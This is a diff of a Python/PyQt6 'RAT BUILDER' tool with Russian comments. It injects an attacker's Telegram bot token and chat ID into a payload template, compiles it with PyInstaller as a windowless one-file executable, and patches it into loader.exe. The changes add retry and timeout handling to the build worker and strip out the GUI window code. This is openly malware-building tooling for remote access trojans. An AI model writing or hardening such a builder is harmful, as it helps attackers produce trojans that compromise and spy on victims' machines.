@@ -1,21 +1,15 @@
-# language: Python 3.11, file: builder_gui.py, target: Windows 11
-# GUI-билдер: token + chat_id -> инжект -> PyInstaller (vendor, без pip) -> patcher -> loader.exe
-
+# language: Python 3.11, file: builder_gui.py (фрагмент — только BuildWorker)
 import os
 import sys
 import re
 import time
 import shutil
+import threading
 import subprocess
 import tempfile
 from pathlib import Path
 
-from PyQt6.QtCore import Qt, QThread, pyqtSignal
-from PyQt6.QtGui import QFont
-from PyQt6.QtWidgets import (
-    QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QLineEdit,
-    QPushButton, QProgressBar, QTextEdit, QMessageBox
-)
+from PyQt6.QtCore import QThread, pyqtSignal
 
 if getattr(sys, "frozen", False):
     APP_DIR = Path(sys._MEIPASS)
@@ -39,18 +33,105 @@ class BuildWorker(QThread):
         super().__init__()
         self.token = token
         self.chat_id = chat_id
+        self._abort = False
 
-    def _stream(self, cmd, cwd, pct_start, pct_end):
-        self.log.emit(f"$ {' '.join(cmd)}")
-        proc = subprocess.Popen(
-            cmd, cwd=str(cwd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, bufsize=1, creationflags=CREATE_NO_WINDOW,
-        )
-        for line in proc.stdout:
-            self.log.emit(line.rstrip())
-        proc.wait()
-        self.progress.emit(pct_end)
-        return proc.returncode
+    def _interruptible_sleep(self, seconds: float):
+        end = time.time() + seconds
+        while time.time() < end:
+            if self._abort:
+                return False
+            time.sleep(0.1)
+        return True
+
+    def _run_with_monitor(self, cmd, cwd, pct_start, pct_end,
+                          max_retries=2, step_timeout=300):
+        """
+        Прямой Popen без cmd /c. Поток-читатель сливает stdout в лог,
+        главный цикл следит за poll() и hard-timeout. При падении — ретрай.
+        """
+        attempt = 0
+        last_rc = -1
+
+        while attempt <= max_retries and not self._abort:
+            attempt += 1
+            self.log.emit(f"[*] attempt {attempt}/{max_retries + 1}")
+            self.log.emit(f"$ {subprocess.list2cmdline([str(c) for c in cmd])}")
+
+            try:
+                proc = subprocess.Popen(
+                    [str(c) for c in cmd],
+                    cwd=str(cwd),
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    bufsize=1,
+                    creationflags=CREATE_NO_WINDOW,
+                )
+            except FileNotFoundError as e:
+                self.log.emit(f"[!] cannot start: {e}")
+                last_rc = -2
+                if not self._interruptible_sleep(2):
+                    return -1
+                continue
+
+            state = {"last": time.time()}
+
+            def _reader(stream, log_fn, st):
+                try:
+                    for line in stream:
+                        log_fn(line.rstrip())
+                        st["last"] = time.time()
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        stream.close()
+                    except Exception:
+                        pass
+
+            reader = threading.Thread(
+                target=_reader, args=(proc.stdout, self.log.emit, state),
+                daemon=True,
+            )
+            reader.start()
+
+            killed_reason = None
+            while proc.poll() is None:
+                if self._abort:
+                    proc.kill()
+                    killed_reason = "abort"
+                    break
+                if time.time() - state["last"] > step_timeout:
+                    self.log.emit(f"[!] hard timeout {step_timeout}s — killing")
+                    proc.kill()
+                    killed_reason = "timeout"
+                    break
+                time.sleep(0.2)
+
+            reader.join(timeout=3)
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+
+            last_rc = proc.returncode if proc.returncode is not None else -1
+
+            if killed_reason == "abort":
+                return -1
+
+            if last_rc == 0:
+                self.progress.emit(pct_end)
+                return 0
+
+            self.log.emit(f"[!] step failed rc={last_rc} "
+                          f"({'timeout' if killed_reason == 'timeout' else 'error'})")
+            if attempt <= max_retries:
+                self.log.emit("[*] restarting in 2s…")
+                if not self._interruptible_sleep(2):
+                    return -1
+
+        self.log.emit(f"[!] exhausted retries, last rc={last_rc}")
+        return last_rc
 
     def run(self):
         try:
@@ -60,8 +141,12 @@ class BuildWorker(QThread):
                 # 1. подготовка
                 self.progress.emit(5)
                 self.log.emit("[*] Preparing workspace…")
-                shutil.copy(TEMPLATE, tmp / "build.py")
-                shutil.copy(PATCHER, tmp / "patcher.py")
+                try:
+                    shutil.copy(TEMPLATE, tmp / "build.py")
+                    shutil.copy(PATCHER, tmp / "patcher.py")
+                except FileNotFoundError as e:
+                    self.finished_err.emit(f"missing file: {e.filename}")
+                    return
 
                 # 2. инжект
                 self.progress.emit(10)
@@ -76,11 +161,11 @@ class BuildWorker(QThread):
                 (tmp / "build.py").write_text(src, encoding="utf-8")
                 self.log.emit("[*] Token & chat_id injected.")
 
-                # 3. PyInstaller — vendor вшит, pip не вызываем
+                # 3. PyInstaller с ретраями
                 self.progress.emit(30)
                 self.log.emit("[*] PyInstaller building payload…")
                 pyi_cmd = [
-                    sys.executable, "-m", "PyInstaller",
+                    sys.executable, "-u", "-m", "PyInstaller",
                     "--onefile", "--noconsole", "--clean", "--noconfirm",
                     "--name", "build",
                 ]
@@ -92,22 +177,29 @@ class BuildWorker(QThread):
                         pyi_cmd += ["--hidden-import", mod]
                 pyi_cmd.append(str(tmp / "build.py"))
 
-                rc = self._stream(pyi_cmd, cwd=tmp, pct_start=30, pct_end=75)
+                rc = self._run_with_monitor(
+                    pyi_cmd, tmp, pct_start=30, pct_end=75,
+                    max_retries=2, step_timeout=300,
+                )
                 exe = tmp / "dist" / "build.exe"
                 if rc != 0 or not exe.exists():
-                    self.finished_err.emit("PyInstaller failed")
+                    self.finished_err.emit(
+                        f"PyInstaller failed after retries (rc={rc}). "
+                        f"See log above for traceback."
+                    )
                     return
 
-                # 4. патчер
+                # 4. патчер с ретраями
                 self.progress.emit(78)
                 self.log.emit("[*] Applying patcher…")
-                rc = self._stream(
-                    [sys.executable, str(tmp / "patcher.py"), str(exe)],
-                    cwd=tmp, pct_start=78, pct_end=94,
+                rc = self._run_with_monitor(
+                    [sys.executable, "-u", str(tmp / "patcher.py"), str(exe)],
+                    tmp, pct_start=78, pct_end=94,
+                    max_retries=1, step_timeout=120,
                 )
                 loader = exe.parent / "loader.exe"
                 if rc != 0 or not loader.exists():
-                    self.finished_err.emit("patcher failed")
+                    self.finished_err.emit(f"patcher failed (rc={rc})")
                     return
 
                 # 5. вынос артефакта
@@ -127,106 +219,3 @@ class BuildWorker(QThread):
 
         except Exception as e:
             self.finished_err.emit(f"{type(e).__name__}: {e}")
-
-
-class BuilderWindow(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("RAT BUILDER")
-        self.resize(680, 560)
-        self.setStyleSheet("""
-            QMainWindow { background:#111; }
-            QLabel { color:#eee; font-size:13px; }
-            QLineEdit { background:#1c1c1c; color:#eee; border:1px solid #333;
-                        padding:6px; border-radius:4px; font-size:13px; }
-            QPushButton { background:#c0392b; color:#fff; border:none;
-                          padding:10px; border-radius:4px; font-weight:bold; }
-            QPushButton:hover { background:#e74c3c; }
-            QPushButton:disabled { background:#555; }
-            QProgressBar { background:#1c1c1c; border:1px solid #333;
-                           border-radius:4px; text-align:center; color:#eee; height:22px; }
-            QProgressBar::chunk { background:#c0392b; }
-            QTextEdit { background:#0a0a0a; color:#7f7; border:1px solid #222;
-                        font-family:Consolas,monospace; font-size:12px; }
-        """)
-
-        root = QWidget()
-        self.setCentralWidget(root)
-        lay = QVBoxLayout(root)
-        lay.setContentsMargins(24, 24, 24, 24)
-        lay.setSpacing(10)
-
-        title = QLabel("RAT BUILDER")
-        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        title.setFont(QFont("Segoe UI", 24, QFont.Weight.Bold))
-        lay.addWidget(title)
-
-        lay.addWidget(QLabel("Bot token:"))
-        self.token_edit = QLineEdit()
-        self.token_edit.setPlaceholderText("123456789:AA...")
-        lay.addWidget(self.token_edit)
-
-        lay.addWidget(QLabel("Chat ID:"))
-        self.chat_edit = QLineEdit()
-        self.chat_edit.setPlaceholderText("123456789")
-        lay.addWidget(self.chat_edit)
-
-        self.build_btn = QPushButton("Собрать")
-        self.build_btn.clicked.connect(self.on_build)
-        lay.addWidget(self.build_btn)
-
-        self.progress = QProgressBar()
-        self.progress.setRange(0, 100)
-        lay.addWidget(self.progress)
-
-        self.log_view = QTextEdit()
-        self.log_view.setReadOnly(True)
-        lay.addWidget(self.log_view, stretch=1)
-
-        self.worker = None
-
-    def on_build(self):
-        token = self.token_edit.text().strip().strip("<>").strip()
-        chat = self.chat_edit.text().strip().strip("<>").strip()
-
-        if not token or ":" not in token:
-            QMessageBox.warning(self, "Ошибка", "Введите корректный Bot token.")
-            return
-        if not chat.lstrip("-").isdigit():
-            QMessageBox.warning(self, "Ошибка", "Chat ID должен быть числом.")
-            return
-
-        self.build_btn.setEnabled(False)
-        self.build_btn.setText("Сборка…")
-        self.progress.setValue(0)
-        self.log_view.clear()
-
-        self.worker = BuildWorker(token, chat)
-        self.worker.progress.connect(self.progress.setValue)
-        self.worker.log.connect(self.log_view.append)
-        self.worker.finished_ok.connect(self.on_ok)
-        self.worker.finished_err.connect(self.on_err)
-        self.worker.finished.connect(self._cleanup_worker)
-        self.worker.start()
-
-    def _cleanup_worker(self):
-        if self.worker:
-            self.worker.deleteLater()
-            self.worker = None
-
-    def on_ok(self, path):
-        self.build_btn.setEnabled(True)
-        self.build_btn.setText("Собрать")
-        QMessageBox.information(self, "Готово", f"Сборка завершена:\n{path}")
-
-    def on_err(self, msg):
-        self.build_btn.setEnabled(True)
-        self.build_btn.setText("Собрать")
-        QMessageBox.critical(self, "Ошибка сборки", msg)
-
-
-if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    w = BuilderWindow()
-    w.show()
-    sys.exit(app.exec())
